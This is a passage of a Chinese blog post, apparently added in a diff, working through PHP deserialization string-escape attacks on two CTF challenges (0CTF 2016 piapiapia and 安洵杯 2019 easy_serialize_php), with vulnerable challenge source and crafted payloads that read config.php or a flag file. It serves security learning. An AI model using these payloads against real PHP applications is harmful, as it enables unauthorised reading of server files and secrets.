class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;filtered str: &quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$sStr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;unserialized normal&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$uStr</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$sStr</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$uStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;unserialized filterd&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$uStr</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$sStr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$uStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="例1fixed"><a href="#例1fixed" class="headerlink" title="+例1fixed"></a>+例1fixed</h4><blockquote>
+<p>出错了导致最后没有解决payload，其实是对正则表达式的疏漏上，<em><strong>还是要本地多试试!!!</strong></em></p>
+</blockquote>
+<ol>
+<li><p>Q: 下面这个payload跑不通</p>
+<ol>
+<li>A: 数组绕过的preg_match()返回的总是false，这里需要利用nickname的，<code>strlen(array)==NULL</code>进行绕过<code>NULL&gt;10</code>总是返回false</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;phone[]&quot;</span></span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>email<span class="string">&quot;;s:7:&quot;</span><span class="number">1</span>@<span class="number">1.</span>com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:5:&quot;</span>hello<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;email&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>@<span class="number">1.</span>com</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname&quot;</span></span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;photo&quot;</span>; filename=<span class="string">&quot;muma.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">what can i say</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz--</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h2><h3 id="基础梳理-1"><a href="#基础梳理-1" class="headerlink" title="-基础梳理"></a>-基础梳理</h3><ol>
+<li>底层知识点: 见字符串逃逸标题</li>
+<li><strong>构造方法</strong>: 由于长度不变但是实际内容替换减短会包含后面正常的部分，利用通过长度判断的特性，通过另一个属性值进行构造可以自定义第一个属性后的完全自定义</li>
+</ol>
+<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><h4 id="例1的思考与过程-1"><a href="#例1的思考与过程-1" class="headerlink" title="-例1的思考与过程"></a>-例1的思考与过程</h4><ol>
+<li>分析<ol>
+<li><p>思路其实很清晰</p>
+</li>
+<li><p>function show_image拿到flag文件可以的话，phpinfo查看信息 –&gt; auto_append_file:d0g3_f1ag.php</p>
+</li>
+<li><p><code>$SESSION</code>要控制<code>img</code>属性的值，这里有两点注意</p>
+<ol>
+<li>img会同通过img_path设定</li>
+<li>总体会被filter过滤</li>
+</ol>
+</li>
+<li><p>找找控制源，<code>extract($_POST)</code>显然是一个，可以将SESSION覆盖掉，但是最重要的img_path呢？还会加密，没法绕过吧，这里考虑从user处开始通过字符串逃逸获取自定义的反序列化</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. origin</span></span><br><span class="line"><span class="comment"> *      a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:8:&quot;img_path&quot;;s:8:&quot;img_path&quot;;s:x:&quot;idontknow&quot;;&#125;</span></span><br><span class="line"><span class="comment"> * 2. target</span></span><br><span class="line"><span class="comment"> *      a:3:&#123;whaterver;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;whatever</span></span><br><span class="line"><span class="comment"> * 3. 构造</span></span><br><span class="line"><span class="comment"> *      1. function可以构造img，构造&#125;来忽略后续的既定部分即可，为了不被认为function的一部分将function的部分使用过滤替换掉</span></span><br><span class="line"><span class="comment"> *          a:3&#123;s:4:&quot;user&quot;;s:x:&quot;x&quot;;s:8:&quot;function&quot;;s:yy:&quot;;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> *          // yy那里肯定两位数，x处是要被过滤的，可以同故宫算式算出来</span></span><br><span class="line"><span class="comment"> *      2. 需要被吞掉的内容</span></span><br><span class="line"><span class="comment"> *          &quot;;s:8:&quot;function&quot;;s:yy: 长度为22</span></span><br><span class="line"><span class="comment"> *          3*6+4=22    这里要是凑不到可以到function值;前多加进行拼凑，只要被覆盖的长度不变就可以不调</span></span><br><span class="line"><span class="comment"> *      3. 传入参数</span></span><br><span class="line"><span class="comment"> *          user: flagphpphpphpphpphpphp</span></span><br><span class="line"><span class="comment"> *          function: ;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="comment"> *          img: whatever</span></span><br><span class="line"><span class="comment"> *      4. 构造成果序列化的字符串：a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:45:&quot;;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:8:&quot;img_path&quot;;s:5:&quot;hello&quot;;&#125;</span></span><br><span class="line"><span class="comment"> * 4. 打不通，改 --&gt; 因为a:3，数组的话元素数量也要对上</span></span><br><span class="line"><span class="comment"> *      1.  function: ;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;add&quot;;s:5:&quot;hello&quot;;&#125;，其他不变，可以打通了</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h4 id="例1总结"><a href="#例1总结" class="headerlink" title="*-例1总结"></a>*-例1总结</h4><ol>
+<li>有机会过一遍phpinfo</li>
+<li><strong>box model</strong>: 在分析时注意一下各个参数之间的关系，不要搞混了，这里理解了序列化后结果和判断条件没有任何关系后会很顺利，不会怪怪的；序列化的function和<code>_SESSION[function]</code>后来也是隔离开的，因为extract的覆盖</li>
+<li><strong>尽量在本地环境上试一试</strong>，纠错快很多</li>
+</ol>
+<h4 id="例1源码"><a href="#例1源码" class="headerlink" title="-例1源码"></a>-例1源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#UNSOVLED"><span class="toc-number">1.</span> <span class="toc-text">UNSOVLED</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">字符串逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A2%9E%E5%8A%A0"><span class="toc-number">3.</span> <span class="toc-text">字符串增加</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">+基础梳理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">3.2.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E8%BF%87%E7%A8%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">+例1的思考与过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E7%9A%84php%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.2.</span> <span class="toc-text">+例1的php测试脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1fixed"><span class="toc-number">3.2.3.</span> <span class="toc-text">+例1fixed</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%8F%E5%B0%91"><span class="toc-number">4.</span> <span class="toc-text">字符串减少</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86-1"><span class="toc-number">4.1.</span> <span class="toc-text">-基础梳理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">4.2.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E8%BF%87%E7%A8%8B-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">-例1的思考与过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E6%80%BB%E7%BB%93"><span class="toc-number">4.2.2.</span> <span class="toc-text">*-例1总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1%E6%BA%90%E7%A0%81"><span class="toc-number">4.2.3.</span> <span class="toc-text">-例1源码</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&text=php反序列化字符逃逸"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&is_video=false&description=php反序列化字符逃逸"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php反序列化字符逃逸&body=Check out this article: https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=php反序列化字符逃逸"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&name=php反序列化字符逃逸&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&t=php反序列化字符逃逸"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
